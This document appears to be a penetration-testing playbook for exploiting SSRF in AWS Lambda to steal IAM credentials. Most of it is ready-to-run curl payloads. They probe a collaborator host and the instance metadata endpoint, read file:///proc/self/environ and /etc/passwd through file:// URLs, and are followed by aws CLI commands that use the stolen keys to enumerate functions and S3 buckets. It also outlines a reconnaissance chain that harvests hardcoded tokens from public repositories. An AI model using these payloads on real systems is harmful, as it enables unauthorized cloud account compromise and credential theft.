# AWS Lambda SSRF → IAM Credential Theft

## Trigger
- API endpoint that fetches user-supplied URLs (file download, URL preview, webhook, "fileName" params)
- Backend confirmed as AWS Lambda (error traces show `/var/task/lambda_function.py`, `AWS_Lambda_rapid`)
- `requests.get(user_input)` or equivalent without protocol restriction

## Technique

### 1. Confirm SSRF (URL fetch behavior)
```bash
curl -sk -X POST "https://target.com/endpoint" \
  -H "authorizationToken: <token>" \
  -H "Content-Type: application/json" \
  -d '{"fileName": "https://your-collaborator.net/ssrf-test"}'
```

### 2. Try IMDS (often blocked on newer Lambda)
```bash
# IMDSv1 — usually blocked (Connection refused on Lambda)
curl -sk -X POST "https://target.com/endpoint" \
  -H "authorizationToken: <token>" \
  -H "Content-Type: application/json" \
  -d '{"fileName": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
```

### 3. file:// Protocol — Read Lambda Environment (PRIMARY VECTOR)
```bash
# Lambda env vars contain temporary IAM credentials
curl -sk -X POST "https://target.com/endpoint" \
  -H "authorizationToken: <token>" \
  -H "Content-Type: application/json" \
  -d '{"fileName": "file:///proc/self/environ"}'
```

**Expected output:** Null-byte separated env vars including:
- `AWS_ACCESS_KEY_ID` — temporary access key (starts with ASIA for session creds)
- `AWS_SECRET_ACCESS_KEY` — secret key
- `AWS_SESSION_TOKEN` — session token (required for API calls)
- `AWS_REGION` — region
- `AWS_LAMBDA_FUNCTION_NAME` — function name for further enumeration
- `AWS_LAMBDA_METADATA_TOKEN` — internal metadata API token

### 4. Additional file:// reads on Lambda
```bash
# Lambda function source code
{"fileName": "file:///var/task/lambda_function.py"}

# Lambda runtime info
{"fileName": "file:///var/runtime/bootstrap"}

# Other handler files (check imports in lambda source)
{"fileName": "file:///var/task/requirements.txt"}

# /etc/passwd for user context
{"fileName": "file:///etc/passwd"}
```

### 5. Use stolen credentials
```bash
export AWS_ACCESS_KEY_ID=ASIAXXX
export AWS_SECRET_ACCESS_KEY=xxx
export AWS_SESSION_TOKEN=xxx
export AWS_DEFAULT_REGION=us-east-1

# Enumerate identity
aws sts get-caller-identity

# List Lambda functions
aws lambda list-functions

# List S3 buckets
aws s3 ls

# Get Lambda env vars (may contain more secrets)
aws lambda get-function-configuration --function-name <name>
```

## Key Points
- Lambda IMDS (169.254.169.254) is often blocked — `file:///proc/self/environ` is the reliable path
- Lambda credentials are temporary (session tokens, ~6h expiry) but refresh on each invocation
- `ASIA` prefix on access key = temporary/session credentials (require session token)
- Error messages from Lambda often leak the handler path (`/var/task/`) confirming Lambda runtime
- If `requests` library is used without protocol filtering, `file://` always works

## OSINT Reconnaissance Pattern (Evident Crime example)
1. Web search for org's SCM platform (GitHub/GitLab/Bitbucket)
2. Find public repos with hardcoded credentials (authorizationTokens, API keys)
3. Check for Swagger/API docs subdomains (`api-docs.target.com`)
4. Swagger reveals endpoint structure → test SSRF on URL-accepting params
5. Exploit SSRF → steal Lambda IAM credentials → pivot into AWS account

## Severity
- SSRF with file:// read = **Critical** (arbitrary local file read + credential theft)
- AWS credential exposure = **Critical** (full cloud account compromise potential)
